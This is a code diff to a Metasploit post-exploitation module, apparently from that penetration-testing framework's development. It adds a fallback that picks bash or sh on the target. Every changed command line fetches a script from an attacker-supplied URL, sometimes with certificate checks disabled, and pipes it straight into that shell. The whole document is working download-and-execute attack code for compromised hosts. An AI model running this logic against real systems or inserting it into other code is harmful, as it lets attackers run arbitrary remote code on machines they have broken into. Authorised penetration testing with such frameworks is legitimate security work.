@@ -82,7 +82,22 @@ class Metasploit3 < Msf::Post
 			@ssl_option = "--no-check-certificate"
 			return
 		end
+	end
 
+	def search_shell
+		print_status("Checking if bash exists in the path...")
+		if exists_exe?("bash")
+			print_good("bash available, using it")
+			@shell = "bash"
+			return
+		end
+
+		print_status("Checking if sh exists in the path...")
+		if exists_exe?("sh")
+			print_good("sh available, using it")
+			@shell = "sh"
+			return
+		end
 	end
 
 	def run
@@ -93,10 +108,17 @@ class Metasploit3 < Msf::Post
 			return
 		end
 
+		search_shell
+
+		if not @shell
+			print_warning("neither bash nor sh available in the $PATH, aborting...")
+			return
+		end
+
 		if datastore['URL'].match(/https/)
-			cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
+			cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
 		else
-			cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
+			cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
 		end
 	end
 
